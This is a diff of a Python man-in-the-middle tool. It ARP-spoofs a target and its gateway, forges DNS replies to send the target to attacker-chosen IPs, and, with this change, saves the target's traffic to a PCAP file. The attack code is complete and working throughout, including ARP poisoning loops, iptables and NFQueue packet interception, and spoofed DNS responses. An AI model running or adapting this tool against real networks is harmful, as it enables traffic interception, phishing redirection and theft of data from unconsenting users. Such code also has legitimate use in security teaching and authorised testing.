@@ -1,39 +1,23 @@
 import socket
 import os
 import scapy.all as scapy
-from scapy.layers.tls.all import TLSApplicationData
 import argparse
 import errno
 import sys
 import ipaddress
 from netfilterqueue import NetfilterQueue
 import multiprocessing as mp
-import json
+import time
+
+from utils import *
 
 # block all encrypted traffic to these endpoints.
-def get_doh_blocked_servers():
-    hostnames = [
-        "cloudflare-dns.com",
-        "mozilla.cloudflare-dns.com",
-        "dns.google",
-        "dns.quad9.net",
-        "dns9.quad9.net",
-        "dns10.quad9.net",
-        "dns11.quad9.net"
-    ]
-
-    res = []
-
-    for host in hostnames:
-        for resp in socket.getaddrinfo(host, 22, type=socket.SOCK_STREAM):
-            if resp[0] is socket.AddressFamily.AF_INET and resp[1] is socket.SocketKind.SOCK_RAW:
-                res.append(resp[4][0])
-
-    return res
-
-# DOH_BLOCKED_SERVERS = get_doh_blocked_servers()
-
-# print(DOH_BLOCKED_SERVERS)
+DOH_BLOCKED_SERVERS = [
+    '1.1.1.1',
+    '1.0.0.1',
+    '8.8.8.8',
+    '8.8.4.4'
+]
 
 def get_mac(ip_addr, interface):
     eth_packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
@@ -49,15 +33,37 @@ def arp_attack(target_ip, gateway_ip, target_mac, gateway_mac, interface):
     p = mp.current_process()
 
     while getattr(p, 'is_running', True):
-        scapy.send(scapy.ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = target_mac), iface=interface)
-        scapy.send(scapy.ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = gateway_mac), iface=interface)
+        scapy.send(
+            scapy.ARP(op = 2, 
+                      pdst = target_ip, 
+                      psrc = gateway_ip, 
+                      hwdst = target_mac
+            ), iface=interface)
+        scapy.send(
+            scapy.ARP(op = 2, 
+                      pdst = gateway_ip, 
+                      psrc = target_ip, 
+                      hwdst = gateway_mac
+            ), iface=interface)
 
 def arp_cleanup(target_ip, gateway_ip, target_mac, gateway_mac, interface):
     print("> Cleaning up ARP spoofing", flush=True)
     
     print("> Re-ARPping target and gateway", flush=True)
-    scapy.send(scapy.ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), iface = interface, count = 10)
-    scapy.send(scapy.ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), iface = interface, count = 10)
+    scapy.send(scapy.ARP(
+        op = 2, 
+        pdst = gateway_ip, 
+        psrc = target_ip, 
+        hwdst = "ff:ff:ff:ff:ff:ff", 
+        hwsrc = target_mac
+    ), iface = interface, count = 10)
+    scapy.send(scapy.ARP(
+        op = 2, 
+        pdst = target_ip, 
+        psrc = gateway_ip, 
+        hwdst = "ff:ff:ff:ff:ff:ff", 
+        hwsrc = gateway_mac
+    ), iface = interface, count = 10)
 
     print("> Disabling IP forwarding", flush=True)
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
@@ -97,16 +103,40 @@ def get_network_adapter():
         print("> Unable to determine adapter. Try again")
 
 class PacketHandler():
-    def __init__(self, interface, target_ip, spoof_map = None) -> None:
+    def __init__(self, interface, target_ip, spoof_map = None, pcap_path = None) -> None:
         self.interface = interface
         self.target_ip = target_ip
         self.self_ip = scapy.get_if_addr(interface)
         self.spoof_map = spoof_map or {} # mapping of fake DNS urls to IP addresses
         self.spoof_all = isinstance(self.spoof_map, str)
 
+        self.pcap_path = pcap_path
+        self.pcap_buffer = []
+        self.pcap_last_write = 0
+        self.pcap_max_write = 60
+
     def handle_udp(self, packet):
         if packet.haslayer(scapy.DNS) and packet.haslayer(scapy.DNSQR):
-            self.handle_dns(packet)  
+            self.handle_dns(packet)
+            return False
+        return True
+    
+    def add_pcap_entry(self, packet):
+        if self.pcap_path is None:
+            return
+        
+        self.pcap_buffer.append(packet)
+
+        if time.time() < self.pcap_last_write + self.pcap_max_write:
+            self.write_pcap_entries()
+            self.pcap_last_write = time.time()
+
+    def write_pcap_entries(self):
+        if len(self.pcap_buffer) == 0:
+            return
+
+        scapy.wrpcap(self.pcap_path, self.pcap_buffer, append=True)
+        self.pcap_buffer = []
 
     def make_dns(self, packet, spoof_ip = None):      
         ip = scapy.IP(
@@ -141,7 +171,8 @@ class PacketHandler():
     
     def get_dns_entry(self, hostname):
         try:
-            return socket.gethostbyname(hostname)
+            res = socket.gethostbyname(hostname)
+            return res
         except:
             return None
     
@@ -152,7 +183,10 @@ class PacketHandler():
             return
 
         if self.spoof_all:
-            scapy.send(self.make_dns(packet, self.spoof_map), iface=self.interface)
+            packet = self.make_dns(packet, self.spoof_map)
+            self.add_pcap_entry(packet)
+            scapy.send(packet, iface=self.interface)
+
             print(f'> Intercepted DNS request to {qname.decode("utf-8")} Modified host IP to {self.spoof_map}')
             return
 
@@ -162,7 +196,9 @@ class PacketHandler():
             if ip is None:
                 return
 
-            scapy.send(self.make_dns(packet, ip), iface=self.interface)
+            packet = self.make_dns(packet, ip)
+            self.add_pcap_entry(packet)
+            scapy.send(packet, iface=self.interface)
             return
 
         if qname not in self.spoof_map:
@@ -174,38 +210,30 @@ class PacketHandler():
             ip = self.spoof_map[qname]
             print(f'> Intercepted DNS request to {qname.decode("utf-8")} Modified host IP to {ip}')
         
-        scapy.send(self.make_dns(packet, ip), iface=self.interface)
+        packet = self.make_dns(packet, ip)
+        self.add_pcap_entry(packet)
+        scapy.send(packet, iface=self.interface)
 
     def handle_tcp(self, packet):
-        if not packet.haslayer(TLSApplicationData):
-            return True
-        
-        return True
-        
-        server_ip = packet[scapy.IP].dst
+        self.add_pcap_entry(packet)
 
-        if server_ip in DOH_BLOCKED_SERVERS:
-            print(server_ip)
-            return False
-        else:
-            return True
+        return True
 
     def handle_packet(self, pkt):
         packet = scapy.IP(pkt.get_payload())
 
         if packet.haslayer(scapy.UDP):
-            self.handle_udp(packet)
-            return
+            if self.handle_udp(packet):
+                pkt.accept()
         elif packet.haslayer(scapy.TCP):
             if self.handle_tcp(packet):
                 pkt.accept()
         else:
             pkt.accept()
        
-
-def mitm_proxy(interface, target_ip, spoof_map):
+def mitm_proxy(interface, target_ip, spoof_map, pcap_path):
     nfqueue = NetfilterQueue()
-    packet_handler = PacketHandler(interface, target_ip, spoof_map)
+    packet_handler = PacketHandler(interface, target_ip, spoof_map, pcap_path)
     nfqueue.bind(1, packet_handler.handle_packet)
 
     print("> NFQueue binded. Packet manipulation starting")
@@ -215,6 +243,7 @@ def mitm_proxy(interface, target_ip, spoof_map):
     except KeyboardInterrupt:
         print('> Closing MITM proxy')
     nfqueue.unbind()
+    packet_handler.write_pcap_entries()
                 
 def init_ip_tables(target_ip, nf_queue):
     print("> Enabling IP Forwarding...", flush=True)
@@ -239,58 +268,6 @@ def destroy_ip_tables():
 
     print("> IPTables rules destroyed")
 
-def load_spoof_ips(spoof_ips):
-    spoof_map = {}
-
-    if len(spoof_ips) == 1:
-        try:
-            socket.inet_aton(spoof_ips[0])
-            return spoof_ips[0]
-        except:
-            with open(spoof_ips[0], 'r') as f:
-                for k, v in json.load(f).items():
-                    if k[-1] != '.':
-                        k += '.'
-                    spoof_map[k.encode('ascii')] = v
-    else:
-        if len(spoof_ips) % 2 == 1:
-            print("> Mapping of host names and IP addresses is not valid. Ensure each host name has an IP address")
-            sys.exit(1)
-        for i in range(0, len(spoof_ips), 2):
-            if spoof_ips[i][-1] != '.':
-                spoof_ips[i] += '.'
-            spoof_map[spoof_ips[i].encode('ascii')] = spoof_ips[i + 1]
-    return spoof_map
-
-def prompt_spoof_ips():
-    spoof_map = {}
-
-    print("> Input hostname and corresponding spoof IP")
-    print("> Enter 'd' or 'done' to stop making new entries, or leave hostname and IP empty")
-    print("> To bind IP to all hosts, leave hostname empty")
-
-    while True:
-        hostname = input('> hostname: ')
-        ip = input("> ip: ")
-
-        if hostname.lower() in {'d', 'done'} or ip.lower() in {'d', 'done'}:
-            return spoof_map
-        
-        if not hostname and not ip:
-            return spoof_map
-        
-        if not hostname and ip:
-            return ip
-
-        if not ip:
-            print("> Failed to parse IP address. Try again")
-            continue
-
-        if hostname[-1] != '.':
-            hostname = hostname + '.'
-        
-        spoof_map[hostname.encode('ascii')] = ip
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-t', '--target', help='target IP address, in human-readable form, dot separated', type=str)
@@ -302,6 +279,8 @@ if __name__ == "__main__":
         a mapping of host names to IPs, passed as a list (i.e google.com 1.2.3.4 microsoft.com 5.6.7.8),
         or a path to JSON file formatted as key-value pairs, such as {'google.com': '1.2.3.4', ...}
     """, nargs='+')
+    parser.add_argument('-p', '--pcap', type=str, help='Path to PCAP file of all target traffic')
+    parser.add_argument('-np', '--no-prompt', action='store_true', help='Prompt for PCAP path and hostname/IP pairs. Does not disable prompt for interface, must manually set interface command option.')
 
     args = parser.parse_args()
 
@@ -312,7 +291,23 @@ if __name__ == "__main__":
         print("> Gateway IP argument required -g/--gateway. See <prog_name> --help for more info.")
         sys.exit(1)
 
-    if args.spoof_ip is None:
+    if args.no_prompt and args.pcap is None:
+        pcap_path = None
+    elif args.pcap is not None:
+        pcap_path = args.pcap
+
+        if pcap_path[0] not in {'.', '/'}:
+            pcap_path = './' + pcap_path
+
+        if not validate_path(pcap_path):
+            print("> Invalid path. Unable to create PCAP at provided path")
+            sys.exit(1)
+    else:
+        pcap_path = prompt_pcap_path()
+
+    if args.no_prompt and args.spoof_ip is None:
+        spoof_map = {}
+    elif args.spoof_ip is None:
         spoof_map = prompt_spoof_ips()
     else:
         spoof_map = load_spoof_ips(args.spoof_ip)
@@ -341,7 +336,7 @@ if __name__ == "__main__":
     gateway_mac = get_mac(args.gateway, interface)
 
     arp_process = mp.Process(target=arp_attack, args = (args.target, args.gateway, target_mac, gateway_mac, interface), daemon=True)
-    mitm_process = mp.Process(target=mitm_proxy, args = (interface, args.target, spoof_map), daemon=True)
+    mitm_process = mp.Process(target=mitm_proxy, args = (interface, args.target, spoof_map, pcap_path), daemon=True)
     
     try:
         arp_process.start()
